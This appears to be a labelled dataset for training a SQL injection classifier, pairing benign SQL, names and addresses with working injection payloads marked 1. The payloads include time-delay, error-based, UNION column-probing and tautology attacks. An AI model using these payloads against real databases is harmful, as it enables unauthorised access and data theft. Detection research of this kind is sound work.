payload	label
1'  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and   (  'nond'  =  'nond	1
bourne_sereys8@demasiado.com.ye	0
   SELECT fence,discover,syllable,those,coast     (  (  shoot JOIN strike ON exist.near =  basis.market )   INNER JOIN rhymeON Orders.table =  torn.roseID ) 	0
SELECT * FROM task WHERE meal = 'kill'  OR southern = 'enjoy'	0
SELECT save ( s )  FROM fairly UNION ALL	0
calle plantio, 178,	0
SELECT whale ( s )  FROM join LEFT JOIN	0
"select count  (  *  )   from generate_series  (  1,5000000  )   and ""xcjt""  =  ""xcjt"	1
SELECT * FROM welcome WHERE NOT eat = 'family'  AND NOT prove = 'explanation'	0
1'  )   where 1115  =  1115	1
SELECT * FROM positive WHERE shinning IN  ( SELECT position FROM bill ) 	0
54368029p	0
-4184'   )    )     )   or 2579  =  4654#	1
SELECT * FROM seed FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM particular	0
  SELECT pond,row FROM native WHERE hold = 'threw' UNION SELECT buffalo, force FROM she	0
"1""  )   as pobe where 1704  =  1704"	1
1'  )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  	1
ductilidad	0
massimo	0
SELECT * FROM next FETCH FIRST 50 PERCENT ROWS ONLY	0
11901410z	0
SELECT * FROM twenty WHERE wrote BETWEEN '1996-07-01' AND '1996-07-31'	0
SELECT engine FROM began UNION ALL SELECT jet FROM chamber ORDER BY log	0
SELECT * FROM halfway WHERE appropriate = 'noted' FETCH FIRST 3 ROWS ONLY	0
danning-marrow@etxarriaranatz.nr	0
1%' or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and '%'  =  '	1
bette	0
-9327'  )   or 3038  =  3038	1
argujillo	0
37170	0
SELECT MIN ( pool )  AS earlier FROM happen	0
benegiles	0
1  )   as bpap where 7758  =  7758 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --	1
SELECT TOP 3 * FROM send WHERE birth = 'hollow' SELECT * FROM liquid	0
SELECT TOP 3 * FROM growth SELECT * FROM catch 3SELECT * FROM mainly	0
"1%""   )    )    union all select null,null,null,null,null#"	1
SELECT * FROM depth WHERE mountain = 'women' FETCH FIRST 3 ROWS ONLY	0
22655130s	0
SELECT * FROM science WHERE heading = 'diameter' FETCH FIRST 3 ROWS ONLY	0
1  )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  	1
6791380000000000	0
1' in boolean mode  )   union all select null,null,null,null,null,null,null#	1
"-4543""  )   or 3038  =  3038"	1
-7378' union all select 2071,2071,2071,2071,2071,2071,2071--	1
1'||  (  select 'lxpg' where 7390  =  7390 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   ||'	1
1'   )    )     )   or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --	1
konstanc	0
22513	0
#NAME?	0
INSERT INTO motor ( air, angry, thread, excellent, elephant, type )  VALUES  ( 'screen', 'rate'. ago', 'won', 'chemical', 'putting', 'buried' )  	0
1' where 2967  =  2967	1
DELETE FROM cloud WHERE happy = 'wash'	0
 SELECT * FROM seems ORDER BY feathers, wave	0
SELECT MIN ( deep )  AS visitor FROM early	0
SELECT joy ( s )  FROM belt SELECT surrounded FROM driving	0
SELECT * FROM  ( SELECT excited FROM principle ) 	0
SELECT option_value FROM wp_options WHERE option_name  =  '_options_contact_email' LIMIT 1	0
mullin@gopersonaltrainers.nr	0
sanou bellsol	0
 SELECT * FROM eat ORDER BY copper, dot	0
SELECT * FROM root WHERE recently = 'parts'  AND City = 'potatoes'	0
 SELECT column_name ( s )  FROM pack,said	0
   SELECT COUNT ( heard ) , floating FROM harder BY difficult	0
"SELECT MONTH ( ""2017-06-15 09:34:21"" ) ;"	0
pineda de la sierra	0
x' OR full_name LIKE '%Bob%	1
1   )    )    procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (   4348  =  4348	1
qu.8ncen3rio	0
"1""  )   as uorp where 7208  =  7208"	1
SELECT * FROM attention WHERE effort = 'does'  OR everything = 'allow'	0
1   )    )    or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --	1
batido	0
calle manzanilla 141,	0
1'  )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and   (  'ndhn' like 'ndhn	1
SELECT weak	0
concursado	0
25727	0
terry@mtos.ar	0
"1""  )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --"	1
   SELECT grain,summer,nearer,brother,sweet     (  (  iron JOIN middle ON slow.occur =  repeat.truck )   INNER JOIN brushON Orders.free =  aside.costID ) 	0
SELECT option_value FROM wp_options WHERE option_name  =  '_options_footer_button_4_text' LIMIT 1	0
SELECT * FROM ocean 3	0
SELECT * FROM birthday WHERE all = 'party' LIMIT 3	0
" select * from users where id  =  1 or ""{  )  "" or 1  =  1 -- 1"	1
9043	0
6837810000000000	0
70136564l	0
1'||  (  select 'ryyc' from dual where 5196  =  5196 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null   )    )   ||'	1
SELECT * FROM return WHERE NOT song = 'construction'  AND NOT willing = 'cap'	0
   SELECT sound, pleasure, you FROM surface WHERE strength  IS NULL	0
"-2548""   )    )     )   or 5107  =  8049--"	1
"1""   )    )    union all select null,null#"	1
select sleep  (  5  )   and 'gajm'  =  'gajm	1
85233754d	0
"1""  )   as zhlf where 4119  =  4119 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --"	1
SELECT ATAN ( -0.8, 2 ) ;	0
1  )   and 9198  =  9198--	1
v	1
SELECT * FROM give  WHERE leader NOT LIKE '[ever]%'	0
pblica	0
5010630000000000	0
1 where 8532  =  8532	1
1em5le28r	0
SELECT COUNT ( DISTINCT closer )  FROM pipe	0
"1""   )    )    as jucs where 6836  =  6836"	1
5660000000000000	0
SELECT * FROM gather WHERE scared NOT LIKE 'cap%'	0
9.26768E+015	0
1  )   where 2010  =  2010	1
10328	0
||6	1
1' union all select null,null,null,null,null,null,null,null#	1
53238791r	0
1   )    )    and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --	1
